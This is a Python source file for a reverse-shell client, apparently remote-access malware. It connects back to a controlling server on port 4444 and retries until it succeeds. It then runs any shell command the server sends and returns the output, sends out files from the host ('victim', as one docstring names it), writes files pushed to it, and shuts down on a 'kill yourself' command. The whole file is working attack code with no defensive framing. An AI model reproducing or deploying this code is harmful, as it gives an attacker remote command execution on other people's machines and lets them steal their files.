import socket
import json
import subprocess
import os
import time
import base64

class Client():

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _send(self, data):
        """Sends data as json to conn."""

        json_data = json.dumps(data)
        self.sock.send(json_data.encode())

    def _receive(self):
        """Return data received form the conn."""

        json_data = ""
        while True:
            try:
                chunk = self.sock.recv(1024)

                if not chunk:
                    return None
                
                json_data += chunk.decode()
                return json.loads(json_data)
            
            except ValueError:
                continue
            except (ConnectionResetError, TypeError):
                return None

    def _exec_command(self, command):

        try:

            if command[:2] == "cd":
                try:
                    os.chdir(command[3:])
                except OSError:
                    return f"Directory {command[3:]} does not exits!"
                
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
                return result
            
        except Exception as e:
           return e

    def _does_file_exists(self, file) -> bool:
        """Check if a file exists or not. Return True or False."""
        
        return os.path.exists(file)

    def _send_file(self, file):
        """Send file to the server"""
        
        with open(file, "rb") as f:

            self._send(base64.b64encode(f.read()).decode())

        return
        
    def _write_file(self, name, data):
        """Download file from the victim."""

        try:
            with open(name, "wb") as file:
                file.write(base64.b64decode(data))
        
        except FileExistsError:
            print(f"[!] File named {name} exists.")

    def _handle_server(self):
        while True:
            command = self._receive()

            if not command:
                continue

            elif "kill yourself" == command:
                self.sock.close()
                return

            elif "download" == command[:8]:

                requested_file = os.path.abspath((command[8:]).strip(' '))

                if self._does_file_exists(requested_file):
                    self._send_file(requested_file)
                else:
                    self._send(f"[!] File {requested_file} does not Exists.")

            elif "upload" == command[:6]:
                file = command[6:].strip(' ')
                data = self._receive()
                self._write_file(file, data)
            
            else:
                result = self._exec_command(command)
                self._send(result)

    def connect(self, ip, port):

        while True:
            try:
                self.sock.connect((ip, port))
                break
            except ConnectionRefusedError:
                time.sleep(5)

        self._handle_server()


if __name__ == "__main__":
    server = Client()
    server.connect("127.0.0.1", 4444)